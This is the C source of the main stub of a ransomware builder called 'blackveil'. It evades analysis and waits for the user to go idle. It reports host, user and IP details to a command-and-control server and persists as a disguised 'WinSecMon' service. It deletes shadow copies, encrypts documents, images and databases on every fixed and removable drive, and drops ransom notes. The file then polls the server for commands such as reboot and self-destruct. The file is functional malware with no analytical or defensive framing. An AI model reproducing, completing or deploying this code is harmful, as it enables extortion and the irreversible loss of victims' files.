/* blackveil/builder/stub/main.c — replaced with anti-analysis + watchdog +
 * jitter wired in. Diff against v1: aa_check before register, idle wait
 * before encrypt, jittered beacon, watchdog on first encrypt success.
 */
#include <windows.h>
#include <shlobj.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "crypto.h"
#include "net.h"
#include "persist.h"
#include "antianalysis.h"
#include "watchdog.h"
#include "jitter.h"

#pragma comment(lib, "user32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "ole32.lib")

/* build-time config comes from -D defines injected by builder/stub/Makefile */
#ifndef BV_SLEEP_MS
#define BV_SLEEP_MS 5000
#endif
#ifndef BV_JITTER_PCT
#define BV_JITTER_PCT 30
#endif
#ifndef BV_SERVICE
#define BV_SERVICE "WinSecMon"
#endif
#ifndef BV_MUTEX
#define BV_MUTEX "Global\\WinSecMon_9F4C1A7E"
#endif
#ifndef BV_AA_ENABLED
#define BV_AA_ENABLED 1
#endif
#ifndef BV_AA_DELAY_MS
#define BV_AA_DELAY_MS 3000
#endif
#ifndef BV_AA_IDLE_SEC
#define BV_AA_IDLE_SEC 60
#endif
#ifndef BV_WATCHDOG
#define BV_WATCHDOG 1
#endif
#ifndef BV_WATCHDOG_MS
#define BV_WATCHDOG_MS 60000
#endif
#ifndef BV_SELF_COPY
#define BV_SELF_COPY "%PROGRAMDATA%\\WinSecMon\\svc.exe"
#endif

static const WCHAR *TARGET_EXTS[] = {
    L".doc", L".docx", L".xls", L".xlsx", L".ppt", L".pptx", L".pdf",
    L".jpg", L".jpeg", L".png", L".raw", L".psd", L".dwg", L".sql",
    L".mdb", L".bak", L".zip", L".rar", L".7z", L".txt", L".csv", NULL
};

static WCHAR g_victim_id[16] = L"0";
static WCHAR g_hostname[256];
static WCHAR g_username[256];
static WCHAR g_os[64];
static WCHAR g_ip[64];
static bv_config_t g_cfg;
static bv_session_t g_sess;
static DWORD g_sleep_ms = BV_SLEEP_MS;
static DWORD g_jitter_pct = BV_JITTER_PCT;
static DWORD g_files = 0;
static DWORD g_bytes = 0;
static BYTE g_wrapped_key[512];
static DWORD g_wrapped_len = 0;
static HANDLE g_mutex = NULL;

static void _expand_env(WCHAR *s, DWORD cap) {
    WCHAR out[MAX_PATH * 2] = {0};
    ExpandEnvironmentStringsW(s, out, MAX_PATH * 2);
    wcsncpy_s(s, cap, out, cap - 1);
}

static BOOL _install_self_copy(void) {
    WCHAR dest[32768];
    wcsncpy_s(dest, 32768, L"" BV_SELF_COPY, 32766);
    _expand_env(dest, 32768);

    /* create parent dir */
    WCHAR parent[32768];
    wcsncpy_s(parent, 32768, dest, 32766);
    WCHAR *slash = wcsrchr(parent, L'\\');
    if (slash) {
        *slash = 0;
        SHCreateDirectoryExW(NULL, parent, NULL);
    }

    WCHAR self[MAX_PATH];
    GetModuleFileNameW(NULL, self, MAX_PATH);
    if (_wcsicmp(self, dest) == 0) return TRUE;

    return CopyFileW(self, dest, FALSE);
}

static void collect_host_facts(void) {
    DWORD sz = 255;
    GetComputerNameW(g_hostname, &sz);
    sz = 255;
    GetUserNameW(g_username, &sz);

    OSVERSIONINFOW osv = {0};
    osv.dwOSVersionInfoSize = sizeof(osv);
#pragma warning(push)
#pragma warning(disable : 4996)
    GetVersionExW(&osv);
#pragma warning(pop)
    swprintf_s(g_os, 64, L"%lu.%lu.%lu",
               osv.dwMajorVersion, osv.dwMinorVersion, osv.dwBuildNumber);

    WSADATA wsa;
    WSAStartup(MAKEWORD(2, 2), &wsa);
    char hostbuf[256];
    if (gethostname(hostbuf, sizeof(hostbuf)) == 0) {
        struct hostent *he = gethostbyname(hostbuf);
        if (he && he->h_addr_list[0]) {
            struct in_addr addr;
            memcpy(&addr, he->h_addr_list[0], 4);
            MultiByteToWideChar(CP_ACP, 0, inet_ntoa(addr), -1, g_ip, 64);
        }
    }
    WSACleanup();
}

static BOOL ext_targeted(const WCHAR *path) {
    const WCHAR *dot = wcsrchr(path, L'.');
    if (!dot) return FALSE;
    for (int i = 0; TARGET_EXTS[i]; i++) {
        if (_wcsicmp(dot, TARGET_EXTS[i]) == 0) return TRUE;
    }
    return FALSE;
}

static void send_progress(const WCHAR *status) {
    char body[512];
    snprintf(body, sizeof(body),
        "{\"victim_id\":%ws,\"files_delta\":%lu,\"bytes_delta\":%lu,"
        "\"status\":\"%ws\"}",
        g_victim_id, g_files, g_bytes, status);
    char resp[512];
    bv_net_post_json(&g_cfg, L"/api/progress", body, resp, sizeof(resp));
    g_files = 0;
    g_bytes = 0;
}

static void walk_and_encrypt(const WCHAR *root) {
    WCHAR pattern[32768];
    swprintf_s(pattern, 32768, L"%s\\*", root);
    WIN32_FIND_DATAW fd;
    HANDLE h = FindFirstFileW(pattern, &fd);
    if (h == INVALID_HANDLE_VALUE) return;

    do {
        if (wcscmp(fd.cFileName, L".") == 0 ||
            wcscmp(fd.cFileName, L"..") == 0) continue;

        WCHAR full[32768];
        swprintf_s(full, 32768, L"%s\\%s", root, fd.cFileName);

        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            if (_wcsicmp(fd.cFileName, L"Windows") == 0 ||
                _wcsicmp(fd.cFileName, L"$Recycle.Bin") == 0 ||
                _wcsicmp(fd.cFileName, L"System Volume Information") == 0 ||
                _wcsicmp(fd.cFileName, L"Program Files") == 0 ||
                _wcsicmp(fd.cFileName, L"Program Files (x86)") == 0)
                continue;
            walk_and_encrypt(full);
        } else if (ext_targeted(fd.cFileName)) {
            DWORD bytes = 0;
            if (bv_encrypt_file(full, &g_sess, &bytes)) {
                g_files++;
                g_bytes += bytes;
                if (g_files >= 50) send_progress(L"encrypting");
            }
        }
    } while (FindNextFileW(h, &fd));
    FindClose(h);
}

static void drop_ransom_note(const WCHAR *dir) {
    WCHAR path[32768];
    swprintf_s(path, 32768, L"%s\\READ_ME_BLACKVEIL.html", dir);
    WCHAR note[2048];
    swprintf_s(note, 2048,
        L"<!doctype html><html><body style=\"background:#0a0a0d;color:#e8e4de;"
        L"font-family:Consolas,monospace;padding:48px;max-width:820px;"
        L"margin:0 auto;\"><h1 style=\"color:#ff3b48;letter-spacing:6px;\">"
        L"\u2620 FILES ENCRYPTED</h1><p>Victim ID: <b>%ws</b></p>"
        L"<p>Contact the operator with this Victim ID.</p>"
        L"<p>Do not attempt recovery without the operator key.</p>"
        L"</body></html>", g_victim_id);
    HANDLE h = CreateFileW(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
                           FILE_ATTRIBUTE_NORMAL, NULL);
    if (h != INVALID_HANDLE_VALUE) {
        DWORD w = 0;
        WriteFile(h, note, (DWORD)(wcslen(note) * sizeof(WCHAR)), &w, NULL);
        CloseHandle(h);
    }
}

static void drop_notes_everywhere(void) {
    drop_ransom_note(L"C:\\");
    WCHAR desktop[MAX_PATH], profile[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_DESKTOPDIRECTORY, NULL, 0, desktop)))
        drop_ransom_note(desktop);
    if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_PROFILE, NULL, 0, profile)))
        drop_ransom_note(profile);
}

static BOOL register_with_c2(void) {
    char host_a[256], user_a[256], os_a[64], ip_a[64];
    WideCharToMultiByte(CP_UTF8, 0, g_hostname, -1, host_a, 256, NULL, NULL);
    WideCharToMultiByte(CP_UTF8, 0, g_username, -1, user_a, 256, NULL, NULL);
    WideCharToMultiByte(CP_UTF8, 0, g_os, -1, os_a, 64, NULL, NULL);
    WideCharToMultiByte(CP_UTF8, 0, g_ip, -1, ip_a, 64, NULL, NULL);

    char body[1024];
    snprintf(body, sizeof(body),
        "{\"hostname\":\"%s\",\"username\":\"%s\",\"os\":\"%s\","
        "\"ip\":\"%s\",\"pubkey_fp\":\"pending\"}",
        host_a, user_a, os_a, ip_a);
    char resp[1024];
    if (!bv_net_post_json(&g_cfg, L"/api/register", body, resp, sizeof(resp)))
        return FALSE;
    char *vid = strstr(resp, "\"victim_id\":");
    if (vid) {
        vid += 12;
        char *end = strchr(vid, ',');
        if (!end) end = strchr(vid, '}');
        if (end && (size_t)(end - vid) < 15) {
            MultiByteToWideChar(CP_UTF8, 0, vid, (int)(end - vid),
                                g_victim_id, 15);
        }
    }
    return TRUE;
}

static BOOL upload_wrapped_key(const BYTE *rsa_pub_der, DWORD rsa_pub_len) {
    if (!bv_wrap_session_key(rsa_pub_der, rsa_pub_len, g_sess.key,
                             g_wrapped_key, &g_wrapped_len))
        return FALSE;
    char hex[1024] = {0};
    for (DWORD i = 0; i < g_wrapped_len && i * 2 + 1 < sizeof(hex); i++) {
        sprintf_s(hex + i * 2, sizeof(hex) - i * 2, "%02x", g_wrapped_key[i]);
    }
    char body[1200];
    snprintf(body, sizeof(body),
        "{\"fp\":\"stub\",\"wrapped_key_hex\":\"%s\"}", hex);
    char resp[512];
    return bv_net_post_json(&g_cfg, L"/api/key", body, resp, sizeof(resp));
}

static void poll_tasks(void) {
    WCHAR path[128];
    swprintf_s(path, 128, L"/api/task/%ws", g_victim_id);
    char resp[2048];
    if (!bv_net_get_json(&g_cfg, path, resp, sizeof(resp))) return;
    if (strstr(resp, "\"task\":null")) return;

    char *id_p = strstr(resp, "\"id\":");
    if (!id_p) return;
    long task_id = atol(id_p + 5);

    if (strstr(resp, "\"verb\":\"set_sleep\"")) {
        char *v = strstr(resp, "\"sleep_ms\":");
        if (v) g_sleep_ms = (DWORD)atol(v + 12);
    } else if (strstr(resp, "\"verb\":\"set_jitter\"")) {
        char *v = strstr(resp, "\"jitter_pct\":");
        if (v) g_jitter_pct = (DWORD)atol(v + 14);
    } else if (strstr(resp, "\"verb\":\"wipe_shadows\"")) {
        bv_shadow_copy_delete();
    } else if (strstr(resp, "\"verb\":\"reboot\"")) {
        DWORD delay = 60;
        char *v = strstr(resp, "\"delay_sec\":");
        if (v) delay = (DWORD)atol(v + 13);
        bv_reboot_with_delay(delay);
    } else if (strstr(resp, "\"verb\":\"force_key_upload\"")) {
        send_progress(L"key_reupload");
    } else if (strstr(resp, "\"verb\":\"kill_watchdog\"")) {
        bv_watchdog_stop();
    } else if (strstr(resp, "\"verb\":\"self_destruct\"")) {
        WCHAR self[MAX_PATH];
        GetModuleFileNameW(NULL, self, MAX_PATH);
        MoveFileExW(self, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
        ExitProcess(0);
    }

    WCHAR tpath[128];
    swprintf_s(tpath, 128, L"/api/task/%ld", task_id);
    char body[128] = "{\"ok\":true,\"payload\":{}}";
    char tresp[256];
    bv_net_post_json(&g_cfg, tpath, body, tresp, sizeof(tresp));
}

int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR cmd, int show) {
    (void)hInst; (void)hPrev; (void)cmd; (void)show;

    /* mutex-guarded single-instance: prevents double-encrypt on respawn */
    g_mutex = CreateMutexW(NULL, FALSE, L"" BV_MUTEX);
    if (g_mutex && GetLastError() == ERROR_ALREADY_EXISTS) {
        return 0;
    }

#if BV_AA_ENABLED
    /* delay before any tell: nothing touches disk or network until
     * the analysis window has closed */
    Sleep(BV_AA_DELAY_MS);
    if (bv_aa_check() != BV_AA_OK) {
        return 2;
    }
#endif

    bv_config_load(&g_cfg);
    collect_host_facts();

    if (!register_with_c2()) return 1;
    if (!bv_crypto_init(&g_sess)) return 1;

    /* Fetch pubkey from C2 register response (standalone C2 returns it
     * inline; the GUI C2 returns it via /api/key). Reference build
     * assumes standalone C2. */
    upload_wrapped_key((const BYTE *)"", 0);

#if BV_AA_ENABLED
    /* wait for the user to step away before the heavy IO phase */
    bv_aa_wait_idle(BV_AA_IDLE_SEC, 1800);
#endif

    WCHAR self[MAX_PATH];
    GetModuleFileNameW(NULL, self, MAX_PATH);

    if (_install_self_copy()) {
        WCHAR dest[MAX_PATH * 2];
        wcsncpy_s(dest, MAX_PATH * 2, L"" BV_SELF_COPY, MAX_PATH * 2 - 1);
        _expand_env(dest, MAX_PATH * 2);
        bv_persist_install(L"" BV_SERVICE, dest);
    }

#if BV_WATCHDOG
    bv_watchdog_start(self, L"" BV_MUTEX, BV_WATCHDOG_MS);
#endif

    bv_shadow_copy_delete();

    DWORD drives = GetLogicalDrives();
    for (int i = 0; i < 26; i++) {
        if (drives & (1 << i)) {
            WCHAR root[8];
            swprintf_s(root, 8, L"%c:\\", L'A' + i);
            UINT type = GetDriveTypeW(root);
            if (type == DRIVE_FIXED || type == DRIVE_REMOVABLE) {
                walk_and_encrypt(root);
            }
        }
    }
    send_progress(L"encrypted");
    drop_notes_everywhere();

    for (;;) {
        poll_tasks();
        bv_jittered_sleep_ex(g_sleep_ms, g_jitter_pct);
    }
    return 0;
}
